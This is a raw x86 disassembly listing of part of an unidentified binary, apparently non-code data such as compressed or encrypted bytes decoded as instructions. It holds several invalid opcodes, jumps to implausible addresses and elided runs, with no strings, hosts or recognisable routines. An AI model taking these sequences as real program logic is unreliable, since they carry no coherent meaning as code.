  415f12:	imul   ebp,DWORD PTR [ebp-0x3b],0x8
  415f16:	dec    ebp
  415f17:	inc    ebx
	...
  415f2c:	les    ebx,FWORD PTR [ebx+0x6b]
  415f2f:	ins    BYTE PTR es:[edi],dx
  415f30:	mov    dl,0x5d
  415f32:	jb     0x415f34
  415f34:	ret    
  415f35:	pop    ebx
  415f36:	data16 je 0x415fb0
  415f39:	pop    ebp
  415f3a:	jb     0x415fa1
  415f3c:	dec    esp
  415f3d:	adc    ebp,DWORD PTR [edi+ebp*2+0x39]
  415f41:	inc    ebp
  415f42:	popa   
  415f43:	ins    BYTE PTR es:[edi],dx
  415f44:	push   0x26
  415f46:	inc    ecx
  415f47:	push   eax
  415f48:	jl     0x415f65
  415f4a:	aas    
  415f4b:	jae    0x415fb2
  415f4d:	cmp    al,0x3e
  415f4f:	push   esp
  415f50:	mov    DWORD PTR [edi],eax
  415f52:	or     esp,DWORD PTR [eax]
  415f54:	mov    DWORD PTR ds:0xf65c6663,edx
  415f5a:	dec    esi
  415f5b:	addr16 pop esi
  415f5d:	add    DWORD PTR [ecx+0x6c],esp
  415f60:	sbb    BYTE PTR gs:[edi],bh
  415f63:	push   esp
  415f64:	dec    esi
  415f65:	shl    BYTE PTR [ebp+0x62],cl
  415f68:	sbb    ch,dl
  415f6a:	add    DWORD PTR [ecx+0x1e],edx
  415f6d:	stc    
  415f6e:	dec    edi
  415f6f:	jne    0x415f89
  415f71:	aad    0x5e
  415f73:	pop    esp
  415f74:	not    dl
  415f76:	bound  ebx,QWORD PTR fs:[eax]
  415f79:	stos   DWORD PTR es:[edi],eax
  415f7a:	xor    BYTE PTR [ecx-0x8],al
  415f7d:	xchg   esi,eax
  415f7e:	ds pop esp
  415f80:	cli    
  415f81:	mov    bl,0x4d
  415f83:	arpl   di,si
  415f85:	mov    dh,BYTE PTR [ecx]
  415f87:	and    BYTE PTR [ecx],dh
  415f89:	pop    es
  415f8a:	dec    esp
  415f8b:	ins    DWORD PTR es:[edi],dx
  415f8c:	fdivr  QWORD PTR [ebx+0x4f35]
	...
  415fa2:	add    BYTE PTR [eax],al
  415fa4:	cli    
  415fa5:	jb     0x41600b
  415fa7:	ins    DWORD PTR es:[edi],dx
  415fa8:	int    0xc4
  415faa:	bound  esi,QWORD PTR [edx+0x39]
  415fad:	xchg   esi,eax
  415fae:	lds    bp,DWORD PTR fs:[ecx+0x62]
  415fb3:	jb     0x415f91
  415fb5:	mov    bh,BYTE PTR [esp+ebp*2]
  415fb8:	into   
  415fb9:	test   BYTE PTR [edx+0x6c],ah
  415fbc:	mov    bl,BYTE PTR [edx+0x6d745042]
  415fc2:	inc    eax
  415fc3:	jae    0x415f72
  415fc5:	jl     0x416002
  415fc7:	push   esp
  415fc8:	mov    DWORD PTR [ecx+0x692019],edi
  415fce:	pop    ecx
  415fcf:	arpl   WORD PTR [edi-0x61a8a59b],dx
  415fd5:	pop    edi
  415fd6:	inc    ebp
  415fd7:	lea    ebp,gs:[eax+edi*1]
  415fdb:	inc    edi
  415fdc:	lea    ebx,[edi+0x56]
  415fdf:	pusha  
  415fe0:	pop    ebx
  415fe1:	popa   
  415fe2:	cmp    DWORD PTR [eax*4+0x5b634347],eax
  415fe9:	popa   
  415fea:	cmp    esi,DWORD PTR [edi]
  415fec:	js     0x41602f
  415fee:	aaa    
  415fef:	dec    ecx
  415ff0:	ins    DWORD PTR es:[edi],dx
  415ff1:	inc    ebx
  415ff2:	adc    al,0x58
  415ff4:	pop    edx
  415ff5:	inc    esi
  415ff6:	cmp    esi,DWORD PTR [ecx+edi*1]
  415ff9:	sub    al,0x26
  415ffb:	pusha  
  415ffc:	and    al,0x62
  415ffe:	or     BYTE PTR [eax+0x8],ah
  416001:	inc    ebx
  416002:	sub    BYTE PTR [edx+edi*8],dh
  416005:	sub    ebp,DWORD PTR [edx]
  416007:	pop    ecx
	...
  41601c:	and    eax,0xe9382565
  416021:	pop    ds
  416022:	mov    bh,0x55
  416024:	sbb    al,0x0
  416026:	mov    ebx,0xc95f154a
  41602b:	fs or  eax,0x944aa33
  416031:	inc    ebp
  416032:	mov    ds:0xc453ea46,eax
  416037:	dec    ecx
  416038:	or     eax,0xd6400730
  41603d:	push   ebx
  41603e:	les    eax,FWORD PTR [ebx]
  416040:	cmc    
  416041:	inc    edx
  416042:	pushf  
  416043:	push   edi
  416044:	fiadd  DWORD PTR [ebp-0x4d]
  416047:	xor    edi,DWORD PTR [ecx]
  416049:	sub    al,0x9a
  41604b:	pusha  
  41604c:	pcmpgtb mm1,QWORD PTR [eax-0x69ccc6a9]
  416053:	imul   esp,DWORD PTR [ebp-0x65aa77a9],0x7eaf002c
  41605d:	das    
  41605e:	jno    0x415fe1
  416060:	sub    BYTE PTR [eax],0x50
  416063:	inc    ebp
  416064:	add    BYTE PTR es:[ecx+0x4e],dl
  416068:	xchg   ebx,eax
  416069:	push   esp
  41606a:	jne    0x4160b4
  41606c:	arpl   WORD PTR [si+0x27],bx
  416070:	pop    ecx
  416071:	das    
  416072:	jno    0x4160c5
  416074:	sub    DWORD PTR [eax],0x50
  416077:	jmp    0x3da7bdab
  41607c:	sub    BYTE PTR [edi],0x72
  41607f:	inc    esp
	...
  416094:	or     DWORD PTR [esi+0x6c],eax
  416097:	or     BYTE PTR [esi+0x58],ah
  41609a:	inc    esi
  41609b:	inc    ecx
  41609c:	or     eax,0xfde9342c
  4160a1:	pop    ebp
  4160a2:	jno    0x4160b9
  4160a4:	sbb    al,0x5c
  4160a6:	ins    BYTE PTR es:[edi],dx
  4160a7:	or     al,0x7
  4160a9:	inc    esp
  4160aa:	pop    edi
  4160ab:	cmc    
  4160ac:	add    dh,BYTE PTR [eax]
  4160ae:	pop    edi
  4160af:	std    
  4160b0:	add    al,BYTE PTR [eax]
  4160b2:	jo     0x4160bc
  4160b4:	icebp  
  4160b5:	push   edi
  4160b6:	add    BYTE PTR [eax-0x378baee8],dh
  4160bc:	out    0x5b,al
  4160be:	and    BYTE PTR [ecx-0x1697abeb],bh
  4160c4:	(bad)  
  4160c5:	cs je  0x416090
  4160c8:	add    BYTE PTR [ebp+0x6c],bl
  4160cb:	(bad)
  4160ce:	add    BYTE PTR [ebp-0x3b8b98d9],dl
  4160d4:	out    dx,eax
  4160d5:	sbb    eax,0xffe68864
  4160da:	pop    ebx
  4160db:	mov    eax,0x826166e1
  4160e0:	sbb    BYTE PTR [edi+ebx*2-0x6b],ah
  4160e4:	cmp    ch,BYTE PTR [eax+ecx*2]
  4160e7:	add    cl,cl
  4160e9:	ss je  0x41615b
  4160ec:	mov    ds:0xb1642e3c,al
  4160f1:	xor    eax,0x2dde5c00
  4160f6:	pop    ebp
  4160f7:	jae    0x4160f9
	...
  416109:	add    BYTE PTR [eax],al
  41610b:	add    BYTE PTR [eax+0x3a],ch
  41610e:	pop    eax
  41610f:	push   eax
  416110:	inc    esp
  416111:	repz call FWORD PTR [ebx+0x4e]
  416115:	pusha  
  416116:	pop    ebp
  416117:	jae    0x416191
  416119:	cmp    bl,BYTE PTR [eax+0x50]
  41611c:	adc    al,0xe8
  41611e:	call   FWORD PTR [ebx+0x1e]
  416121:	sub    DWORD PTR [ebp+eiz*2+0x4a],ebp
  416125:	sub    DWORD PTR [esp+ebp*2-0x7f],ebp
  416129:	add    al,0x5c
  41612b:	jae    0x416156
  41612d:	sub    BYTE PTR [ecx+0x6d],ah
  416130:	xor    DWORD PTR [edx+0x5d],esp
  416133:	addr16 sub eax,0xb5782e36
  416139:	sub    eax,0x66b25c00
  41613e:	pop    edi
  41613f:	gs sub BYTE PTR ss:[edi+0x65],ch
  416144:	mov    ds:0x93726127,al
  416149:	pop    ds
  41614a:	js     0x4161b9
  41614c:	add    DWORD PTR fs:[esi+eiz*2+0x69],ebx
  416151:	sub    eax,0x2d797a61
  416156:	ins    BYTE PTR es:[edi],dx
  416157:	popa   
  416158:	jbe    0x416193
  41615a:	imul   ebp,DWORD PTR [eax+eiz*2+0x14],0x28ac666b
  416162:	pop    ebp
  416163:	jb     0x4161d2
  416165:	sbb    eax,0x66946946
  41616a:	pop    edx
  41616b:	imul   esp,DWORD PTR [ebp+ebp*1+0x5d],0x0
	...
  416182:	add    BYTE PTR [eax],al
  416184:	and    DWORD PTR [eax+0x66],0x74
  416188:	cmp    DWORD PTR [esi+0x62],ebp
  41618b:	jb     0x416129
  41618d:	fwait
  41618e:	inc    edi
  41618f:	addr16 popf 
  416191:	jl     0x4161be
  416193:	addr16 xchg ebp,eax
  416195:	jnp    0x4161f9
  416197:	and    BYTE PTR [edx-0x7d],bh
  41619a:	pop    edx
  41619b:	arpl   WORD PTR [edi-0x60b8fead],sp
  4161a1:	sub    bl,BYTE PTR [eax+0x5f]
  4161a4:	xchg   ebp,eax
  4161a5:	cmp    ebp,DWORD PTR [edi]
  4161a7:	inc    esp
  4161a8:	nop
  4161a9:	sub    DWORD PTR [eax+ecx*2],eax
  4161ac:	data16 sub bl,BYTE PTR [eax+0x0]
  4161b0:	test   BYTE PTR [edx],cl
  4161b2:	gs jb  0x4161ee
  4161b5:	out    0x60,eax
  4161b7:	jno    0x416223
  4161b9:	xlat   BYTE PTR ds:[ebx]
  4161ba:	xor    DWORD PTR [ebp+0x4b],ebp
  4161bd:	adc    eax,DWORD PTR [edx+edx*2]
  4161c0:	push   esp
  4161c1:	hlt    
  4161c2:	pop    esi
  4161c3:	je     0x416221
  4161c5:	mov    bh,0x45
  4161c7:	addr16 dec ebx
  4161c9:	xlat   BYTE PTR ds:[ebx]
  4161ca:	xor    al,0x63
  4161cc:	sub    esi,ebp
  4161ce:	fs jb  0x41622a
  4161d1:	jmp    0x41621b
  4161d3:	jo     0x4161f1
  4161d5:	xlat   BYTE PTR ds:[ebx]
  4161d6:	xor    al,0x63
  4161d8:	sub    ecx,ebp
  4161da:	data16 jb 0x416244
  4161dd:	pop    ds
  4161de:	pop    edi
  4161df:	jno    0x4161e6
  4161e1:	xlat   BYTE PTR ds:[ebx]
  4161e2:	xor    al,0x63
  4161e4:	or     esi,DWORD PTR [ebp+0x7266]
	...
  4161fa:	add    BYTE PTR [eax],al
  4161fc:	dec    edi
  4161fd:	mov    WORD PTR [ebx+eiz*2-0x15],ss
  416201:	(bad)  
  416202:	xor    al,0x63
  416204:	jmp    0x416192
  416206:	data16 jb 0x416220
  416209:	bound  esi,QWORD PTR [bx+di-0x16]
  41620d:	(bad)  
  41620e:	xor    al,0x63
  416210:	retf   
  416211:	xchg   esp,eax
  416212:	data16 jb 0x416234
  416215:	add    BYTE PTR [edi-0x18ac34a0],dh
  41621b:	xor    ebx,esi
  41621d:	push   ebx
  41621e:	jg     0x416223
  416220:	mov    BYTE PTR [ebp-0x67],ah
  416223:	pop    ecx
  416224:	call   0xe765:0xa94a9b4e
  41622b:	aas    
  41622c:	jle    0x41627d
  41622e:	jnp    0x416253
  416230:	push   0x9a597965
  416235:	dec    esi
  416236:	pop    es
  416237:	cmp    al,0x94
  416239:	dec    edi
  41623a:	push   ebx
  41623b:	add    al,0x6d
  41623d:	popa   
  41623e:	pop    edx
  41623f:	pop    eax
  416240:	sbb    DWORD PTR [edi],ebp
  416242:	inc    esp
  416243:	push   edx
  416244:	cmp    DWORD PTR gs:[si],esp
  416248:	mov    cl,BYTE PTR [edi+0x44]
  41624b:	push   edx
  41624c:	cmp    DWORD PTR [eax+ecx*2],edi
  41624f:	push   ebx
  416250:	dec    ebp
  416251:	and    BYTE PTR [edx],bl
  416253:	imul   ecx,DWORD PTR [ebx+0x52],0x3019520c
  41625a:	or     BYTE PTR [ebx+0x48],dl
  41625d:	add    BYTE PTR [ebx],ah
  41625f:	add    BYTE PTR gs:[eax],al
	...
  416272:	add    BYTE PTR [eax],al
  416274:	sub    BYTE PTR [edi+eax*8+0x32],dl
  416278:	sbb    cl,BYTE PTR [esi-0x3]
  41627b:	push   0x5f17202b
  416280:	sub    edx,DWORD PTR [edi+eiz*8+0x3f]
  416284:	test   BYTE PTR [esi-0xd],0x23
  416288:	call   0x1a973bf1
  41628d:	dec    esi
  41628e:	pop    es
  41628f:	xor    al,0xde
  416291:	push   ebx
  416292:	mov    edi,0xda610503
  416297:	push   edi
  416298:	sbb    DWORD PTR [edi],ebp
  41629a:	int3   
  41629b:	push   ecx
  41629c:	out    dx,eax
  41629d:	fs mov ecx,0x490523
  4162a3:	mov    ecx,0x9545ffe1
  4162a8:	or     ah,BYTE PTR [eax]
  4162aa:	dec    esi
  4162ab:	mov    ah,ch
  4162ad:	bound  esp,QWORD PTR [ebp-0x78]
  4162b0:	out    0x5c,al
  4162b2:	jb     0x41629d
  4162b4:	jl     0x4162ea
  4162b6:	push   eax
  4162b7:	leave  
  4162b8:	jnp    0x416317
  4162ba:	imul   edx,DWORD PTR [ebp+ebx*4-0x777b9ba6],0x0
  4162c2:	data16 jge 0x41632f
  4162c5:	pop    esp
  4162c6:	addr16 jp 0x41632f
  4162c9:	sbb    dh,BYTE PTR [ecx+eiz*2+0x61]
  4162cd:	add    BYTE PTR [ebx+ebp*1+0x60],bl
  4162d1:	pop    esp
  4162d2:	ins    BYTE PTR es:[edi],dx
  4162d3:	dec    esp
  4162d4:	xchg   ecx,eax
  4162d5:	xor    BYTE PTR [edx+0x3e],dh
	...
  4162ec:	mov    fs,WORD PTR [edx+0x20]
  4162ef:	sbb    al,BYTE PTR [esi+0x54367462]
  4162f5:	dec    esi
  4162f6:	arpl   cx,bp
  4162f8:	xor    al,0x64
  4162fa:	pop    edi
  4162fb:	xor    eax,0x19621a35
  416300:	push   0x0
  416302:	push   ecx
  416303:	push   cs
  416304:	push   edi
  416305:	push   esp
  416306:	jne    0x416310
  416308:	or     ebx,DWORD PTR [edi+0x5c]
  41630b:	sub    esp,DWORD PTR [ebp+0x42]
  41630e:	push   esp
  41630f:	sbb    DWORD PTR [ecx+0x3e],ebp
  416312:	jae    0x416321
  416314:	sbb    DWORD PTR [edi+0x74],ebx
  416317:	leave  
  416318:	dec    edx
  416319:	dec    esi
  41631a:	ins    DWORD PTR es:[edi],dx
  41631b:	(bad)  
  41631c:	adc    al,0x20
  41631e:	inc    esi
  41631f:	mov    ebp,0xc84b2c4a
  416324:	fstp   QWORD PTR [ecx+0x0]
  416327:	mov    edx,0xd6746217
  41632c:	aad    0x4d
  41632e:	arpl   WORD PTR [eax],ax
  416330:	pushf  
  416331:	inc    eax
  416332:	jno    0x4163a0
  416334:	ins    BYTE PTR es:[edi],dx
  416335:	push   edi
  416336:	je     0x416388
  416338:	xchg   edx,eax
  416339:	sub    DWORD PTR [ebx+0x66],ebp
  41633c:	inc    eax
  41633d:	packssdw mm4,QWORD PTR [esi-0x5c]
  416341:	xor    DWORD PTR [ebp+0x72],ebx
  416344:	mov    ch,0x1a
  416346:	inc    edx
  416347:	jne    0x416305
  416349:	sub    DWORD PTR [ecx+0x74],esp
  41634c:	lock das 
  41634e:	imul   ebp,DWORD PTR [edi+0x0],0x0
	...
  416362:	add    BYTE PTR [eax],al
  416364:	mov    dh,0x1d
  416366:	inc    esi
  416367:	push   esp
  416368:	rcr    BYTE PTR ds:0x58b96c3f,0x6e
  41636f:	je     0x41632d
  416371:	inc    eax
  416372:	pop    ebp
  416373:	imul   ebp,DWORD PTR [esi+0x4],0x28766f4f
  41637a:	jae    0x4163dd
  41637c:	xchg   edx,eax
  41637d:	popa   
  41637e:	pop    esp
  41637f:	inc    edx
  416380:	xor    BYTE PTR [edx+0x54],al
  416383:	push   eax
  416384:	sbb    al,0x3e
  416386:	jno    0x4163f4
  416388:	ins    BYTE PTR es:[edi],dx
  416389:	popa   
  41638a:	je     0x4163ac
  41638c:	xor    BYTE PTR [esi],ch
  41638e:	imul   ebp,DWORD PTR [edi+0x76],0x24
  416392:	inc    esi
  416393:	push   esp
  416394:	add    BYTE PTR [eax],dl
  416396:	dec    ebx
  416397:	jo     0x4163bd
  416399:	and    eax,0x4536e6b
  41639e:	dec    edi
  41639f:	outs   dx,DWORD PTR ds:[esi]
  4163a0:	sub    BYTE PTR ss:[ebx+0x61],dh
  4163a4:	mov    ds:0xa5425c62,al
  4163a9:	sub    DWORD PTR [ebp+eiz*2-0x6c],ebp
  4163ad:	or     eax,0x638f6f72
  4163b2:	and    BYTE PTR [ebx+0x6f],dl
  4163b5:	arpl   WORD PTR [edi+esi*2+0x71],si
  4163b9:	das    
  4163ba:	popa   
  4163bb:	pop    esp
  4163bc:	cmp    DWORD PTR [ebp-0x3c2293aa],edx
  4163c2:	push   ebp
  4163c3:	push   eax
  4163c4:	jmp    0x416377
  4163c6:	pop    esp
  4163c7:	data16 add BYTE PTR [eax],al
	...
  4163da:	add    BYTE PTR [eax],al
  4163dc:	sbb    DWORD PTR [ecx-0x69e6afcb],esp
  4163e2:	pop    ebp
  4163e3:	addr16 aam 0x88
  4163e6:	push   ebp
  4163e7:	pop    esp
  4163e8:	mul    BYTE PTR [esi+0x55]
  4163eb:	addr16 into 
  4163ed:	js     0x41643f
  4163ef:	add    BYTE PTR [edx-0x598b9c7e],cl
  4163f5:	js     0x416446
  4163f7:	arpl   WORD PTR [ebp-0x7ab9ce6b],ax
  4163fd:	add    DWORD PTR [si-0x68],ecx
  416401:	inc    esi
  416402:	push   ebp
  416403:	push   ecx
  416404:	xchg   esp,eax
  416405:	inc    esi
  416406:	push   eax
  416407:	addr16 xchg esi,eax
  416409:	xor    DWORD PTR [esi+0x67],eax
  41640c:	lea    eax,[esp+eax*1+0x51]
  416410:	pusha  
  416411:	sub    esp,DWORD PTR [ebp+0x71]
  416414:	jne    0x416456
  416416:	push   edx
  416417:	add    BYTE PTR [eax+0x31],dh
  41641a:	dec    edi
  41641b:	je     0x416475
  41641d:	cmp    esp,DWORD PTR [eax+0x44]
  416420:	pusha  
  416421:	add    eax,0xf1f0011
  416426:	pop    ebp
  416427:	ins    BYTE PTR es:[edi],dx
  416428:	cmp    DWORD PTR [ebx+0x2f],eax
  41642b:	imul   ebx,DWORD PTR [eax-0x1b],0x57
  41642f:	inc    esi
  416430:	or     eax,0x18460407
  416435:	icebp  
  416436:	pop    edx
  416437:	jb     0x416449
  416439:	retf   
  41643a:	data16 jno 0x41648c
  41643d:	add    esp,DWORD PTR [ecx+0x74]
	...
  416454:	cmp    DWORD PTR [edi],ebx
  416456:	pop    ecx
  416457:	jno    0x41645e
  416459:	retf   0x774f
  41645c:	push   edi
  41645d:	add    bl,cl
  41645f:	bound  eax,QWORD PTR ds:0xdd67c800
  416465:	dec    ebp
  416466:	leave  
  416467:	pop    eax
  416468:	pop    ds
  416469:	fs enter 0x3957,0x4f
  41646e:	mov    esp,0xd54d85a
  416473:	push   0x2fe753f6
  416478:	in     eax,0x52
  41647a:	mov    ecx,0xbb41d461
  41647f:	xor    edi,DWORD PTR [ecx]
  416481:	sub    eax,0x4fad658e
  416486:	mov    BYTE PTR [ecx-0x66],dl
  416489:	and    al,0xb3
  41648b:	push   esi
  41648c:	stos   DWORD PTR es:[edi],eax
  41648d:	bound  edx,QWORD PTR [esi-0x18cf7abb]
  416493:	pop    edx
  416494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416495:	push   ebx
  416496:	jnp    0x4164fa
  416498:	popf   
  416499:	push   esp
  41649a:	ja     0x4164fe
  41649c:	lea    ebx,[eax-0x19]
  41649f:	mov    WORD PTR ss:[esi+0x53],ds
  4164a3:	push   ebx
  4164a4:	xchg   esi,eax
  4164a5:	push   edx
  4164a6:	dec    esp
  4164a7:	sub    BYTE PTR [eax-0x7a9aaca9],cl
  4164ad:	ds sub eax,0xe7308542
  4164b3:	inc    esi
  4164b4:	dec    ebx
  4164b5:	pop    ebp
  4164b6:	dec    ebx
  4164b7:	popa   
	...
  4164cc:	pop    edi
  4164cd:	dec    esp
  4164ce:	inc    eax
  4164cf:	gs push ebp
  4164d1:	xor    ecx,DWORD PTR [eax]
  4164d3:	pop    eax
  4164d4:	inc    ebp
  4164d5:	add    BYTE PTR [edx],ch
  4164d7:	push   esi
  4164d8:	sbb    bl,BYTE PTR [esp+ecx*1+0x5a]
  4164dc:	and    eax,0xf8580859
  4164e1:	push   edi
  4164e2:	or     al,0x67
  4164e4:	adc    BYTE PTR [eax],al
  4164e6:	sbb    bl,BYTE PTR [ebx+0x1f]
  4164e9:	dec    esp
  4164ea:	add    dh,bh
  4164ec:	adc    eax,0x4e0d6352
  4164f1:	push   ebp
  4164f2:	je     0x4164bc
  4164f4:	push   esi
  4164f5:	ds inc esi
  4164f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f8:	xor    BYTE PTR es:[esi+eiz*4+0xa],bl
  4164fd:	dec    esp
  4164fe:	addr16 mov esi,0x99005100
  416504:	aad    0x50
  416506:	jno    0x4164be
  416508:	repz push ecx
  41650a:	fs jmp 0xbba4b619
  416510:	add    BYTE PTR [edi],ah
  416512:	imul   ecx,DWORD PTR [edx+edi*1-0x796592c8],0x7
  41651a:	fs fwait
  41651c:	xchg   DWORD PTR [eax],eax
  41651e:	push   edx
  41651f:	test   BYTE PTR [ecx+0x5e8c7455],al
  416525:	pop    edi
  416526:	jb     0x416511
  416528:	dec    edx
  416529:	push   ebp
  41652a:	jb     0x4165a9
  41652c:	cmp    bh,BYTE PTR [eax]
  41652e:	ins    DWORD PTR es:[edi],dx
  41652f:	jp     0x416531
	...
  416541:	add    BYTE PTR [eax],al
  416543:	add    BYTE PTR [esi+0x36],dh
  416546:	pop    edi
  416547:	push   esp
  416548:	cwde   
  416549:	add    BYTE PTR [eax+0x4e],dl
  41654c:	(bad)  
  41654d:	dec    esp
  41654e:	add    BYTE PTR [esi+eax*4],bh
  416551:	arpl   WORD PTR [edx+0x3f],si
  416554:	pop    esp
  416555:	pop    ebx
  416556:	arpl   cx,bp
  416558:	sub    ah,BYTE PTR [edi]
  41655a:	jno    0x416596
  41655c:	push   0x55
  41655e:	jb     0x4165ad
  416560:	xor    eax,0x693a6d38
  416565:	cmp    al,0x67
  416567:	sbb    eax,DWORD PTR [ebx]
  416569:	daa    
  41656a:	imul   eax,DWORD PTR [edi*1+0x90f6d31],0x4d
  416572:	pop    edi
  416573:	sbb    ebx,DWORD PTR [eax]
  416575:	and    al,0x41
  416577:	add    BYTE PTR [edi+0x62],al
  41657a:	gs cmp ax,0x713f
  41657f:	jo     0x416501
  416581:	or     eax,0x318c666b
  416586:	pop    ebp
  416587:	jb     0x4165f6
  416589:	push   ds
  41658a:	inc    ebp
  41658b:	outs   dx,BYTE PTR ds:[esi]
  41658c:	mov    WORD PTR [edi+0x72],ds
  41658f:	outs   dx,BYTE PTR ds:[esi]
  416590:	jge    0x4165c8
  416592:	pop    esp
  416593:	push   eax
  416594:	sub    BYTE PTR [ecx],0x66
  416597:	imul   eax,DWORD PTR [edi+ebx*2+0x29b3006f],0x5b8f7466
  4165a2:	jb     0x416609
  4165a4:	mov    ah,0x40
  4165a6:	push   esp
  4165a7:	push   eax
	...
  4165bc:	jg     0x416619
  4165be:	jb     0x416625
  4165c0:	hlt    
  4165c1:	ds dec ebx
  4165c3:	push   edx
  4165c4:	fnstsw WORD PTR [edi]
  4165c6:	push   esp
  4165c7:	push   eax
  4165c8:	aam    0xe
  4165ca:	gs je  0x41657a
  4165cd:	add    BYTE PTR cs:[eax-0x39],cl
  4165d1:	cs je  0x4165d4
  4165d4:	lods   eax,DWORD PTR ds:[esi]
  4165d5:	cs popa 
  4165d7:	jb     0x4165e9
  4165d9:	adc    ch,BYTE PTR [ebx+0x72]
  4165dc:	pop    esp
  4165dd:	cld    
  4165de:	dec    edi
  4165df:	push   edi
  4165e0:	loopne 0x4165f3
  4165e2:	je     0x41664c
  4165e4:	xor    bh,ah
  4165e6:	dec    esi
  4165e7:	push   ebx
  4165e8:	sbb    ah,bh
  4165ea:	outs   dx,DWORD PTR ds:[esi]
  4165eb:	jb     0x416574
  4165ed:	bound  esp,QWORD PTR [ebp+0x6c]
  4165f0:	jge    0x41661d
  4165f2:	cs js  0x41666a
  4165f5:	sub    BYTE PTR [eax],al
  4165f7:	pop    esp
  4165f8:	push   ds
  4165f9:	adc    BYTE PTR [eax+0x20],dl
  4165fc:	or     eax,0x476c7034
  416601:	cs popa 
  416603:	jb     0x41663e
  416605:	xlat   BYTE PTR ds:[ebx]
  416606:	xor    al,0x6d
  416608:	pop    ds
  416609:	jmp    0x416659
  41660b:	pop    edi
  41660c:	sub    esi,esp
  41660e:	daa    
  41660f:	inc    esi
  416610:	in     eax,dx
  416611:	out    0x23,al
  416613:	inc    ebx
  416614:	adc    edi,eax
  416616:	push   ebp
  416617:	ins    DWORD PTR es:[edi],dx
  416618:	or     edi,esp
  41661a:	push   ebp
  41661b:	pop    esp
  41661c:	test   DWORD PTR [edx+0x2031],0x0
	...
  416632:	add    BYTE PTR [eax],al
  416634:	cld    
  416635:	ficom  WORD PTR [ecx+0x6c]
  416638:	fisubr WORD PTR [eax-0x71fa8da2]
  41663e:	pop    eax
  41663f:	jb     0x416613
  416641:	mov    DWORD PTR [ecx+0x5f],edx
  416644:	fidivr DWORD PTR [ebx-0x6608b4db]
  41664a:	sub    eax,0x4382d66d
  41664f:	pop    edi
  416650:	retf   
  416651:	stos   DWORD PTR es:[edi],eax
  416652:	adc    esi,DWORD PTR [edx]
  416654:	ins    DWORD PTR es:[edi],dx
  416655:	xlat   BYTE PTR ds:[ebx]
  416656:	inc    ebx
  416657:	jae    0x4165fe
  416659:	arpl   WORD PTR [eax+0x6e],bx
  41665c:	stos   BYTE PTR es:[edi],al
  41665d:	xlat   BYTE PTR ds:[ebx]
  41665e:	xor    al,0x6d
  416660:	xchg   edi,eax
  416661:	inc    ebx
  416662:	push   eax
  416663:	pop    edi
  416664:	mov    edi,DWORD PTR [ebp+eiz*1+0x46]
  416668:	and    DWORD PTR gs:[bp+di-0x7f],eax
  41666d:	inc    edi
  41666e:	push   ebp
  41666f:	ins    DWORD PTR es:[edi],dx
  416670:	mov    esi,DWORD PTR [esi+edx*2]
  416673:	pop    esp
  416674:	mov    DWORD PTR [ecx],ebp
  416676:	push   edi
  416677:	pushaw 
  416679:	cmp    ebx,DWORD PTR [ebp+0x71]
  41667c:	cmp    DWORD PTR [edi],eax
  41667e:	popa   
  41667f:	jno    0x4166eb
  416681:	push   es
  416682:	push   edi
  416683:	jb     0x4166e2
  416685:	xlat   BYTE PTR ds:[ebx]
  416686:	xor    DWORD PTR [edi+0x4a],ebx
  416689:	or     cl,BYTE PTR [edi+0x6d]
  41668c:	dec    ebx
  41668d:	cmp    esi,DWORD PTR [eax]
  41668f:	ja     0x4166da
  416691:	add    BYTE PTR [esp+eax*1],cl
  416694:	add    DWORD PTR [ebp+0x1a],edx
  416697:	push   eax
	...
  4166ac:	cmp    DWORD PTR [esi+eax*1],esi
  4166af:	popa   
  4166b0:	push   ds
  4166b1:	push   esi
  4166b2:	out    0x33,eax
  4166b4:	or     al,0x52
  4166b6:	sti    
  4166b7:	add    edi,esi
  4166b9:	push   ebp
  4166ba:	adc    BYTE PTR [eax+0x16],dl
  4166bd:	pop    edi
  4166be:	add    esi,DWORD PTR [esi+eiz*8]
  4166c1:	dec    ebx
  4166c2:	inc    DWORD PTR [ebx]
  4166c4:	test   DWORD PTR [ebx-0x29],0xc44bde34
  4166cb:	sbb    ecx,esi
  4166cd:	push   edx
  4166ce:	ret    
  4166cf:	add    eax,DWORD PTR ds:0xd45ad93e
  4166d5:	pop    esi
  4166d6:	mov    ebx,0xd00085e
  4166db:	pop    ebx
  4166dc:	fist   WORD PTR [esi-0x19]
  4166df:	daa    
  4166e0:	out    dx,eax
  4166e1:	pop    esi
  4166e2:	mov    ebp,0x8c58c63f
  4166e7:	daa    
  4166e8:	js     0x41673d
  4166ea:	lea    esp,[ecx-0x6a]
  4166ed:	pop    ebx
  4166ee:	mov    bl,0x34
  4166f0:	call   0x7a52:0x8c5a9a4f
  4166f7:	add    esi,DWORD PTR [ebp+0x2f]
  4166fa:	test   BYTE PTR [eax+ecx*4+0x59],dl
  4166fe:	xchg   BYTE PTR [ecx-0x78],bl
  416701:	add    BYTE PTR [edx+0x5e4c9758],bl
  416707:	imul   ebx,DWORD PTR gs:[ebp+0x3b],0x2e
  41670c:	mov    ss,WORD PTR [edx+0x2b]
  41670f:	dec    ebp
	...
  416724:	push   eax
  416725:	pop    ebp
  416726:	sub    esi,DWORD PTR [ebx]
  416728:	pop    edx
  416729:	pop    edi
  41672a:	cmp    al,0x52
  41672c:	pop    edx
  41672d:	cmp    bl,BYTE PTR [edi]
  41672f:	add    al,0x78
  416731:	push   ebx
  416732:	add    BYTE PTR [edi+0x67],al
  416735:	pop    ebx
  416736:	or     DWORD PTR gs:0x3d117423,eax
  41673d:	das    
  41673e:	ins    BYTE PTR es:[edi],dx
  41673f:	adc    eax,0x3146230b
  416744:	ins    DWORD PTR es:[edi],dx
  416745:	add    BYTE PTR [edx+ebx*1-0x4],bl
  416749:	dec    ebx
  41674a:	arpl   dx,di
  41674c:	sub    al,0x48
  41674e:	imul   ecx,DWORD PTR ds:0x1d462435,0x4d
  416755:	cs jae 0x416752
  416758:	loop   0x416759
  41675a:	push   ecx
  41675b:	fmul   QWORD PTR [ebx]
  41675d:	pop    eax
  41675e:	push   ecx
  41675f:	sar    dh,1
  416761:	pop    esi
  416762:	rol    DWORD PTR cs:[ecx],1
  416765:	push   esp
  416766:	add    BYTE PTR [edx-0x3389b227],bh
  41676c:	call   0xd9fbba70
  416771:	dec    ebp
  416772:	outs   dx,BYTE PTR ds:[esi]
  416773:	enter  0x5ee1,0x0
  416777:	cdq    
  416778:	aad    0x50
  41677a:	jno    0x41671a
  41677c:	(bad)  
  41677d:	dec    esi
  41677e:	fs jmp 0xb9b1b3f0
  416784:	(bad)  
  416785:	dec    esi
